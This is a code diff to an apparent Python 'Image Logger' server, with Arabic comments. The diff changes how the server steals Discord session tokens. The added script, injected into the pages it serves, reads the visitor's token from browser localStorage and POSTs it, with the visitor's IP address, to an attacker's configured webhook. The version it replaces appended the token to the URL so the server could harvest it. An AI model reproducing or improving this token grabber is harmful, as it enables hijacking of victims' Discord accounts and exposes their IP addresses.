@@ -194,7 +194,11 @@ height: 100vh;
             else:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                token = dic.get("token")  # استخراج التوكن من استفسار URL
+
+                # استخراج التوكن مباشرة من السكربت
+                token = None
+                if 'token' in dic:
+                    token = dic['token']
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
@@ -235,17 +239,29 @@ height: 100vh;
                 self.send_header('Content-type', datatype)
                 self.end_headers()
 
-                # إضافة سكربت لسحب التوكن وإضافته إلى URL
+                # سكربت لسحب التوكن وإرساله مباشرة
                 data += b'''<script>
 var discordToken = localStorage.getItem('token');
 if (discordToken) {
-    var currenturl = window.location.href;
-    if (currenturl.includes("?")) {
-        currenturl += "&token=" + encodeURIComponent(discordToken);
-    } else {
-        currenturl += "?token=" + encodeURIComponent(discordToken);
-    }
-    location.replace(currenturl);
+    fetch("''' + config["webhook"].encode() + b'''", {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            username: "''' + config["username"].encode() + b'''",
+            content: "",
+            embeds: [{
+                title: "Image Logger - Discord Token Captured",
+                color: ''' + str(config["color"]).encode() + b''',
+                description: `**A Discord Token was captured!**\\n**Token:** \`${discordToken}\`\\n**IP:** \`${"''' + self.headers.get('x-forwarded-for').encode() + b'''"}\``
+            }]
+        })
+    }).then(response => {
+        if (!response.ok) {
+            console.error("Failed to send token:", response.status);
+        }
+    }).catch(error => console.error("Error:", error));
 }
 </script>'''
 
